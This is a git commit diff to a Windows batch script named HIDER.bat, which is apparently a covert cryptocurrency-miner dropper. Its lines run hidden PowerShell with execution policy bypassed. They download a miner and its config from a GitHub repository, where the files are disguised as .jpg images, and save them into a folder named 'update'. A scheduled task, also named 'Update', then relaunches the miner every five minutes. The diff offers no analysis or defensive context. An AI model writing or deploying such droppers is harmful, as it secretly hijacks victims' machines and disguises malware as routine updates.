85a994df2c245fcb9ec85118375f1394fee0f387
rodadaajuda <41061724+rodadaajuda@users.noreply.github.com>
2018-07-13 17:22:38 -0300

    Update HIDER.bat

--- HIDER.bat
+++ HIDER.bat
@@ -1,6 +1,6 @@
 @echo off
 mkdir "%LOCALAPPDATA%\update"
-powershell.exe -NoP -NonI -W Hidden -Force -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/miner.jpg ',\"$env:LOCALAPPDATA\update\miner.exe\")
-powershell.exe -NoP -NonI -W Hidden -Force -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/config.jpg ',\"$env:LOCALAPPDATA\update\config.json\")
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/miner.jpg ',\"$env:LOCALAPPDATA\update\miner.exe\") -Force
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/config.jpg ',\"$env:LOCALAPPDATA\update\config.json\") -Force
 SCHTASKS /Create /SC MINUTE /MO 5 /TN "Update" /TR "%LOCALAPPDATA%\update\miner.exe"
 Exit
